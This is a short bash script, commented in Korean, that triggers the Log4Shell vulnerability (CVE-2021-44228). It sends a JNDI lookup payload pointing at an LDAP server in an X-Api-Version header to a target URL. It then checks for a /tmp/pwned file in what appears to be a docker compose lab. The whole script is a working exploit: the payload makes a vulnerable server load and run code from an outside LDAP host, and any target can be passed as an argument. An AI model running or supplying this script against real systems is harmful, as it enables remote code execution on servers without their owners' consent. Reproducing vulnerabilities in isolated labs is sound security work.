#!/bin/bash
# CVE-2021-44228 (Log4Shell) 트리거 스크립트
# 사용법: ./trigger.sh [대상 URL, 기본값 http://localhost:8080/]

set -e

TARGET="${1:-http://localhost:8080/}"
PAYLOAD='${jndi:ldap://ldap-server:1389/Exploit}'

echo "[*] 대상: $TARGET"
echo "[*] 페이로드: $PAYLOAD"

curl -s "$TARGET" \
  -H "X-Api-Version: $PAYLOAD" \
  -o /dev/null

echo "[*] 요청 전송 완료. 아래 명령으로 결과를 확인하세요:"
echo "    docker compose exec app cat /tmp/pwned"
